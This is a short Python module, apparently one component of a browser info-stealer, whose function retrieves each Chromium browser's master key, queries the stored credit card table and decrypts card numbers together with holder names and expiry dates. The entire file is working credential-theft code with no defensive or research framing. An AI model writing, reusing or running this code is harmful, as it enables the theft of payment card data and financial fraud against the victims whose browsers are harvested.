
# Import modules
from . import GetMasterKey, FetchDataBase, DecryptValue, GetBrowsers

""" Fetch credit cards from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        master_key = GetMasterKey(browser)
        database = FetchDataBase(browser + "\\Web Data", "SELECT * FROM credit_cards")
        for row in database:
            if not row[4]:
                break
            card = {
                "number": DecryptValue(row[4], master_key),
                "expireYear": row[3],
                "expireMonth": row[2],
                "name": row[1],
            }
            credentials.append(card)

    return credentials
